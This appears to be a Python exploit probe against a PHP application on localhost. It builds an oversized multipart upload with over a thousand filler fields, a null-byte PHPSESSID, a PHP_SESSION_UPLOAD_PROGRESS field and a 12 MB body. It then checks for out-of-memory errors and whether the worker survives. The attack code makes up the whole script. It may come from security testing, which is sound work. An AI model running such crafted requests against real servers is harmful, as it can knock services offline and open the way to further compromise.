import sys, time
sys.path.insert(0, r"C:\Users\likat\p2s52704")
from exploit import Target, build_multipart
t = Target("http://127.0.0.1:18113/index.php", timeout=60, verbose=False)

parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [{"name": "PHPSESSID", "data": b"\x00"},
          {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
          {"name": "f", "filename": "a.txt", "data": b"A" * 64},
          {"name": "big", "data": b"B" * (12 * 1024 * 1024)}]
raw = t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=60)
# split headers/body
if b"\r\n\r\n" in raw:
    head, body = raw.split(b"\r\n\r\n", 1)
else:
    head, body = b"", raw
print(f"total={len(raw)}B body={len(body)}B")
print("head:", head.decode("latin1", "replace")[:300])
low = body.lower()
print("OOM markers: outofmem=", b"out of memory" in low, " memlimit=", b"memory limit" in low,
      " max=", b"maximum execution" in low, " body<100=", len(body) < 100)
print("body head:", body[:150].replace(b"\r", b"\\r").replace(b"\n", b"\\n"))
time.sleep(0.5)
raw2 = t.post(build_multipart([{"name":"x","data":"1"}], b"B1"), b"B1", read_cap=1024, timeout=20)
print("worker after OOM:", raw2[:120].replace(b"\r", b"\\r").replace(b"\n", b"\\n"))
